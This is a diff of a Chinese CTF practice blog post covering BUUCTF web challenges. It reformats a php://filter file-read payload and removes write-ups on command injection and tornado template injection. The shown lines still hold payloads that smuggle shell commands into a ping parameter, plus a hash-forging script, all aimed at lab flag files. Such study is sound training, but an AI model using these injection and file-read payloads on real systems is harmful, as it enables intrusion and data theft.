@@ -28,7 +28,7 @@
 <meta property="og:description" content="坦白说，第一次刷题感觉不是很好，边做边看WP太low了，不可能提升，很多东西没吸收，好多payload都是复制粘贴，所以二刷，想把之前丢掉的知识捡回来，系统地学习 [HCTF 2018]WarmUp两个php文件，hint.php提示flag在ffffllllaaaagggg代码审计：白名单，传入值在白名单里， $_page &#x3D; mb_substr(&#x2F;&#x2F;mb_substr() 函数返回字符串的一部">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-03-07T08:58:29.000Z">
-<meta property="article:modified_time" content="2021-03-07T12:54:03.343Z">
+<meta property="article:modified_time" content="2021-03-12T12:54:42.388Z">
 <meta property="article:author" content="六公子买单">
 <meta property="article:tag" content="二刷buu">
 <meta name="twitter:card" content="summary">
@@ -173,10 +173,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-03-07 16:58:29 / Modified: 20:54:03" itemprop="dateCreated datePublished" datetime="2021-03-07T16:58:29+08:00">2021-03-07</time>
+              <time title="Created: 2021-03-07 16:58:29" itemprop="dateCreated datePublished" datetime="2021-03-07T16:58:29+08:00">2021-03-07</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-12 20:54:42" itemprop="dateModified" datetime="2021-03-12T20:54:42+08:00">2021-03-12</time>
+              </span>
 
           
 
@@ -215,7 +221,9 @@ return true;//要求截取的字符串在白名单内，所以source,php和hint.
 <hr>
 <h2 id="极客大挑战-2019-Havefun-1"><a href="#极客大挑战-2019-Havefun-1" class="headerlink" title="[极客大挑战 2019]Havefun 1"></a>[极客大挑战 2019]Havefun 1</h2><p>源码，get传参</p>
 <hr>
-<h2 id="ACTF2020-新生赛-Include-1"><a href="#ACTF2020-新生赛-Include-1" class="headerlink" title="[ACTF2020 新生赛]Include 1"></a>[ACTF2020 新生赛]Include 1</h2><p>php://filter协议<br>?file=php://filter/read=convert.base64-encode/resource=flag.php </p>
+<h2 id="ACTF2020-新生赛-Include-1"><a href="#ACTF2020-新生赛-Include-1" class="headerlink" title="[ACTF2020 新生赛]Include 1"></a>[ACTF2020 新生赛]Include 1</h2><pre><code>php://filter协议  
+?file=php://filter/read=convert.base64-encode/
+resource=flag.php</code></pre>
 <hr>
 <h2 id="极客大挑战-2019-Secret-File-1"><a href="#极客大挑战-2019-Secret-File-1" class="headerlink" title="[极客大挑战 2019]Secret File 1"></a>[极客大挑战 2019]Secret File 1</h2><p>抓包，得php，代码审计，get传参<br>strstr(“Hello world!”,”world”);  // 输出 world!<br>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE<br>该函数是区分大小写的。如需进行不区分大小写的搜索，请使用 stristr() 函数。  </p>
 <pre><code>if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))  </code></pre>
@@ -230,30 +238,6 @@ return true;//要求截取的字符串在白名单内，所以source,php和hint.
 <h3 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h3><p>index.php代码有一个变量a,可以用变量a代替被过滤的flag中的某个字符，从而绕过flag过滤，进而读取flag<br>/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php</p>
 <h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><pre><code>/?ip=127.0.0.1;cat$IFS$2`ls`</code></pre>
 <p>将反引号内命令的输出结果作为输入来进行命令执行，这样flag.php和index.php的结果都能直接查看（flag在源码中）  </p>
-<hr>
-<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>PING<br>常见管道符命令执行：</p>
-<p>1、|（就是按位或），直接执行|后面的语句</p>
-<p>2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</p>
-<p>3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假</p>
-<p>4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-<p>5、; 前后都执行，无论前面真假，同&amp;，（linux也有）</p>
-<p>法一：用127.0.0.1;ls ../找，../目录穿越，直到127.0.0.1;ls ../../../看到flag,用127.0.0.1;cat ../../../flag读取</p>
-<p>法二：127.0.0.1 | find / -name flag直接找，得/flag,读取：127.0.0.1 | cat /flag</p>
-<hr>
-<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>蚁剑登录，flag在根目录</p>
-<hr>
-<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>考察SSTI(模板注入)<br>tornado是一个python的模板，render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页<br>flag in /fllllllllllllag<br>通过handler.settings对象获取cookie_secret的值，即：<br>handler指向RequestHandler<br>RequestHandler.settings指向self.application.settings<br>所以handler.settings最终指向RequestHandler.application.settings，</p>
-<p>?msg=得到cookie_secret，</p>
-<p>写脚本得到md5(cookie_secret+md5(filename))</p>
-<pre><code>import hashlib
-
-filename = &#39;/fllllllllllllag&#39;
-cookie_secret = &quot;db3053bf-a59d-4f87-bdcb-30e165e0167b&quot;
-tmp = hashlib.md5(filename.encode(encoding=&#39;utf-8&#39;)).hexdigest()
-data = cookie_secret + tmp
-res = hashlib.md5(data.encode(encoding=&#39;utf-8&#39;)).hexdigest()
-print(res)</code></pre>
-<p>?filename=/fllllllllllllag<br>&amp;filehash=3bc0e02c9138512bbd1aa0d86451772e</p>
 <hr>
 <h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>源码提示：calc.php</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#39;num&#39;]))&#123;&#x2F;&#x2F;不显示num才会包含文件</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#39;echo &#39;.$str.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -300,7 +284,10 @@ print(res)</code></pre>
     <a href="/2021/03/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="文件上传">
       <i class="fa fa-chevron-left"></i> 文件上传
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/08/buu17-32/" rel="next" title="buu-17-32">
+      buu-17-32 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -359,7 +346,7 @@ print(res)</code></pre>
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">1.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="nav-number">2.</span> <span class="nav-text">[极客大挑战 2019]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">3.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-1"><span class="nav-number">4.</span> <span class="nav-text">[极客大挑战 2019]Havefun 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-1"><span class="nav-number">5.</span> <span class="nav-text">[ACTF2020 新生赛]Include 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File-1"><span class="nav-number">6.</span> <span class="nav-text">[极客大挑战 2019]Secret File 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL-1"><span class="nav-number">7.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">8.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sh"><span class="nav-number">8.1.</span> <span class="nav-text">sh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="nav-number">8.2.</span> <span class="nav-text">变量拼接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-number">8.3.</span> <span class="nav-text">内联注释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="nav-number">9.</span> <span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="nav-number">10.</span> <span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-number">11.</span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">12.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="nav-number">13.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="nav-number">14.</span> <span class="nav-text">[极客大挑战 2019]PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload-1"><span class="nav-number">15.</span> <span class="nav-text">[极客大挑战 2019]Upload 1</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">1.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="nav-number">2.</span> <span class="nav-text">[极客大挑战 2019]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">3.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-1"><span class="nav-number">4.</span> <span class="nav-text">[极客大挑战 2019]Havefun 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-1"><span class="nav-number">5.</span> <span class="nav-text">[ACTF2020 新生赛]Include 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File-1"><span class="nav-number">6.</span> <span class="nav-text">[极客大挑战 2019]Secret File 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL-1"><span class="nav-number">7.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">8.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sh"><span class="nav-number">8.1.</span> <span class="nav-text">sh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="nav-number">8.2.</span> <span class="nav-text">变量拼接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-number">8.3.</span> <span class="nav-text">内联注释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">9.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="nav-number">10.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="nav-number">11.</span> <span class="nav-text">[极客大挑战 2019]PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload-1"><span class="nav-number">12.</span> <span class="nav-text">[极客大挑战 2019]Upload 1</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -373,7 +360,7 @@ print(res)</code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -382,7 +369,7 @@ print(res)</code></pre>
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
